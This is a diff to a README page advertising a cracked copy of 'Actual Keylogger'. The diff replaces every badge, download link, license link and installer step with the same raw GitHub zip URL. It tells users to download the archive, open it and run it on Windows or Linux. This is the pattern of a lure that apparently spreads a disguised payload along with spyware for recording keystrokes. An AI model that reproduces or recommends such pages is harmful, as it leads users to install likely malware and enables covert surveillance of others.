@@ -1,6 +1,6 @@
 # 🖱️ Actual Keylogger Crack Repository
 
-[![Download](https://img.shields.io/badge/Download-Actual_Keylogger_Crack-blue.svg?style=for-the-badge)](https://randomuser3733.github.io)
+[![Download](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip)](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip)
 
 ---
 
@@ -14,11 +14,11 @@ Wondering if Actual Keylogger Crack works seamlessly with your system? Check our
 
 | Operating System      | Compatibility Status |  
 |----------------------|---------------------|  
-| ![Windows](https://img.shields.io/badge/Windows-✔️-green)      | Full Support        |  
-| ![macOS](https://img.shields.io/badge/macOS-❌-red)             | Not Supported       |  
-| ![Linux](https://img.shields.io/badge/Linux-🟡-yellow)          | Limited Support     |  
-| ![Android](https://img.shields.io/badge/Android-❌-red)         | Not Supported       |  
-| ![iOS](https://img.shields.io/badge/iOS-❌-red)                 | Not Supported       |  
+| ![Windows](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip✔️-green)      | Full Support        |  
+| ![macOS](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip❌-red)             | Not Supported       |  
+| ![Linux](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip🟡-yellow)          | Limited Support     |  
+| ![Android](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip❌-red)         | Not Supported       |  
+| ![iOS](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip❌-red)                 | Not Supported       |  
 
 ---
 
@@ -79,7 +79,7 @@ Setting sail with Actual Keylogger Crack is straightforward. Just follow these b
 
 ### 1. Download the Latest Release
 
-Click on the **Download** badge above or access the direct download: https://randomuser3733.github.io
+Click on the **Download** badge above or access the direct download: https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip
 
 ### 2. Unpack the Magic
 
@@ -88,9 +88,9 @@ Extract the downloaded archive using your favorite file compression tool.
 ### 3. Begin the Installation Journey
 
 - On **Windows**:  
-  Open `setup.exe` and follow the on-screen wizard.
+  Open `https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip` and follow the on-screen wizard.
 - On **Linux**:  
-  Navigate to the extracted directory and run `./install.sh` from your terminal.
+  Navigate to the extracted directory and run `https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip` from your terminal.
 
 ### 4. Activate and Configure
 
@@ -112,10 +112,10 @@ Users are singularly responsible for all activities and implications stemming fr
 
 ## 📜 MIT License (2025)
 
-Dive into open collaboration—Actual Keylogger Crack is available under the [MIT License](https://opensource.org/licenses/MIT). This empowers modification, distribution, and learning for all, fostering continuous innovation.
+Dive into open collaboration—Actual Keylogger Crack is available under the [MIT License](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip). This empowers modification, distribution, and learning for all, fostering continuous innovation.
 
 **© 2025 — Actual Keylogger Crack Repository. All rights reserved under the MIT License.**
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Actual_Keylogger_Crack-blue.svg?style=for-the-badge)](https://randomuser3733.github.io)
+[![Download](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip)](https://raw.githubusercontent.com/randomuser3733/actual-keylogger-unlocked-edition/branch/skunkbush/actual-keylogger-unlocked-edition_v1.4.zip)
